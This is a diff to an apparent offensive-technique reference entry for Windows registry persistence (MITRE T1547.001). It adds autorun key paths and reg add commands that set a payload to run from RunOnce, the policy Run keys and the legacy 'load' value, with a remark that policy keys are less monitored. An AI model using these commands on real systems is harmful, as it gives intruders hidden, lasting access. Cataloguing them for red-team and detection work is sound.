@@ -6,8 +6,14 @@ tags:
 mitre_ids:
   - T1547.001
 keys:
-  - "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-  - "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
+  - 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
+  - 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+  - 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+  - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
+  - 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
+  - 'HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows'
+  - 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows'
 use_cases:
   - title: "Execute a binary on user login"
     description: "Adds a value to the Run key to execute a payload on user login."
@@ -17,5 +23,17 @@ use_cases:
     description: "Executes a PowerShell script on user login."
     code: |
       reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\update.ps1" /f
+  - title: "RunOnce persistence"
+    description: "RunOnce keys execute once and are deleted. Useful for one-time payload execution after reboot."
+    code: |
+      reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+  - title: "Group Policy Run key"
+    description: 'Policies\Explorer\Run keys are set via GPO and less commonly monitored.'
+    code: |
+      reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "PolicyPayload" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+  - title: "Load/Run values in Windows key"
+    description: "Legacy persistence via 'load' and 'run' values in the Windows key."
+    code: |
+      reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "load" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
 resources:
   - link: https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
